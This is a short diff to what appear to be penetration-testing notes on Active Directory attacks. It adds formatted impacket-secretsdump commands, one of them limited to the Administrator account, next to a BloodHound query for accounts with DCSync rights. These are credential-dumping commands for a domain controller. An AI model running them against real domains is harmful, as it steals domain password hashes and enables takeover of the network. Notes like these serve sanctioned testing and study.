@@ -17,7 +17,16 @@ Common Strategies
 3 lines > Analysis > Dangerous Privileges > Find Principals with DCSync Rights
 ```
 
-Secrets Dump (Impacket)
-`impacket-secretsdump domain/username@ipaddress` (Enter user password at prompt)
+Secrets Dump
+```
+impacket-secretsdump domain/username@ipaddress
+(Enter user password at prompt)
+```
+
+Secrets Dump Just Administrator
+```
+impacket-secretsdump domain/username@ipaddress -just-dc-user Administrator
+(Enter user password at prompt)
+```
 
 
